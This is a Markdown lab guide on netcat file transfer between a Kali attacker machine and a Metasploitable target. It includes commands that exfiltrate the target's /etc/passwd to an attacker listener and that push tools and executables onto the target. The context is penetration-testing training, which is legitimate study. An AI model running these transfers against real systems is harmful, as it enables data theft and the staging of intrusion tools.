# 🔌 Netcat File Transfer — Step-by-Step Guide

> **What is it?** Netcat (`nc`) is a simple networking tool. It can send raw data over the network — including entire files. Think of it like a pipe between two machines.

> **When to use?** When the target doesn't have `wget`/`curl`, or when you want a quick, tool-free transfer using just raw TCP connections.

---

## 📋 What You Need

| Item                  | Details                                    |
| --------------------- | ------------------------------------------ |
| **Kali IP**           | `192.168.56.10`                            |
| **Metasploitable IP** | `192.168.56.20`                            |
| **Tools needed**      | `nc` (netcat) — installed on both machines |

---

## 🧠 Key Concept: Listener vs Connector

```
LISTENER  ◄────────────  CONNECTOR
(waits)       connects      (initiates)
(port open)   to listener   (sends/receives)
```

- **Listener** = the machine that opens a port and waits
- **Connector** = the machine that connects to the listener
- Either side can send OR receive — it's just about who listens first

---

## 📥 Method 1: Target Downloads from Kali (Target Pulls)

> **Scenario**: You want to send a tool (like LinPEAS) from Kali to the target.

### How It Works

```
Kali (sender)                    Metasploitable (receiver)
┌─────────────┐                  ┌─────────────┐
│ Listens on  │ ◄─── connects ── │  Connects & │
│ port 4444   │ ─── sends file → │  saves file  │
│ serves file │                  │              │
└─────────────┘                  └─────────────┘
```

### Step 1: On Kali — serve the file (be the listener)

```bash
cd ~/Documents/file_transfer_practice
nc -lvnp 4444 < test_file.txt
```

> **What the flags mean:**
> - `-l` = listen mode (wait for connection)
> - `-v` = verbose (show what's happening)
> - `-n` = no DNS lookup (faster)
> - `-p 4444` = use port 4444
> - `< test_file.txt` = send this file's content when someone connects

### Step 2: On Metasploitable — grab the file

```bash
nc 192.168.56.10 4444 > received_file.txt
```

> **What happens:**
> - Connects to Kali on port 4444
> - `> received_file.txt` = save whatever comes in to this file
> - Press `Ctrl+C` after a second or two to close the connection

### Step 3: Verify

```bash
cat received_file.txt
# Should show: "This is a test file from Kali"
```

---

## 📤 Method 2: Target Uploads to Kali (Target Pushes)

> **Scenario**: You found `/etc/passwd` on the target and want to send it back to Kali.

### How It Works

```
Kali (receiver)                  Metasploitable (sender)
┌─────────────┐                  ┌─────────────┐
│ Listens on  │ ◄─── connects ── │  Connects & │
│ port 4444   │ ◄── sends file ─ │  sends file  │
│ saves file  │                  │              │
└─────────────┘                  └─────────────┘
```

### Step 1: On Kali — listen and save incoming file

```bash
nc -lvnp 4444 > exfiltrated_file.txt
```

> This time Kali is the **receiver** — notice the `>` instead of `<`.

### Step 2: On Metasploitable — send the file

```bash
nc 192.168.56.10 4444 < /etc/passwd
```

> `< /etc/passwd` = send this file's contents to Kali.
> Press `Ctrl+C` after a moment to close.

### Step 3: Verify on Kali

```bash
cat exfiltrated_file.txt
# Should show the Metasploitable /etc/passwd file contents
```

---

## ✅ Method 3: Transfer with Verification (md5sum)

> **Why?** To make sure the file wasn't corrupted during transfer. The hash should match on both sides.

### After any transfer, check on BOTH machines

```bash
# On the SENDER machine
md5sum test_file.txt
# Example output: d41d8cd98f00b204e9800998ecf8427e  test_file.txt

# On the RECEIVER machine
md5sum received_file.txt
# Output should show the SAME hash!
```

> ✅ **Same hash** = file transferred perfectly
> ❌ **Different hash** = something went wrong, transfer again

---

## 📤 Method 4: Reverse Listener (Target Listens, Kali Connects)

> **When to use?** Sometimes in pentesting, you need the **target** to listen because a firewall blocks outgoing connections from Kali.

### Step 1: On Metasploitable — listen

```bash
nc -lvnp 5555 > received_file.txt
```

### Step 2: On Kali — connect and send

```bash
nc 192.168.56.20 5555 < test_file.txt
```

> This is the same idea, just reversed — the target listens instead of Kali.

---

## 🔄 Method 5: Transfer a Binary File (Like an Exploit)

> Text files are easy, but you might need to transfer compiled exploits or scripts.

```bash
# On Kali — send a binary
nc -lvnp 4444 < /usr/bin/whoami

# On Metasploitable — receive and save
nc 192.168.56.10 4444 > whoami_copy
chmod +x whoami_copy
./whoami_copy
```

> ⚠️ Always `chmod +x` after transferring an executable!

---

## 🧠 Quick Reference Cheatsheet

| What You Want                | Kali Command               | Target Command               |
| ---------------------------- | -------------------------- | ---------------------------- |
| **Send file TO target**      | `nc -lvnp 4444 < file.txt` | `nc KALI_IP 4444 > file.txt` |
| **Receive file FROM target** | `nc -lvnp 4444 > file.txt` | `nc KALI_IP 4444 < file.txt` |
| **Verify transfer**          | `md5sum file.txt`          | `md5sum file.txt`            |

### Remember This Simple Rule

```
< file.txt  →  SEND this file (input goes into netcat)
> file.txt  →  SAVE to this file (output comes from netcat)
```

---

## ❗ Common Mistakes & Fixes

| Problem                   | Fix                                                              |
| ------------------------- | ---------------------------------------------------------------- |
| `Connection refused`      | Listener isn't running yet — always start the **listener first** |
| File is empty (0 bytes)   | You mixed up `<` and `>` — check sender vs receiver              |
| Connection hangs          | Press `Ctrl+C` on both sides to close. Netcat doesn't auto-close |
| `nc: command not found`   | Try `ncat` or `netcat` instead                                   |
| Transfer stuck/incomplete | Increase wait time or use `nc -w 3` (3-second timeout)           |

---

## ⚖️ Netcat vs HTTP Transfer

| Feature                     | Netcat                | HTTP (Python)           |
| --------------------------- | --------------------- | ----------------------- |
| Setup difficulty            | ⭐ Easy                | ⭐ Easy                  |
| Needs special tools         | No (nc is everywhere) | Python on server side   |
| Can transfer multiple files | One at a time         | Browse and download any |
| Stealth                     | Medium (raw TCP)      | Low (HTTP logs)         |
| Best for                    | Quick single file     | Serving many files      |

---

## ✅ Practice Checklist

- [ ] Transfer a file from Kali TO Metasploitable (Kali listens)
- [ ] Transfer a file from Metasploitable TO Kali (Kali listens)
- [ ] Verify a transfer using `md5sum` on both sides
- [ ] Transfer a binary/executable file
- [ ] Try the reverse listener approach (target listens)

---

> 🔙 **Previous**: [HTTP Transfer](./01_http_transfer.md)
> 🔙 **Back to**: [File Transfer Main Guide](./file_transfer.md)
> ➡️ **Next**: [SMB Transfer](./03_smb_transfer.md)
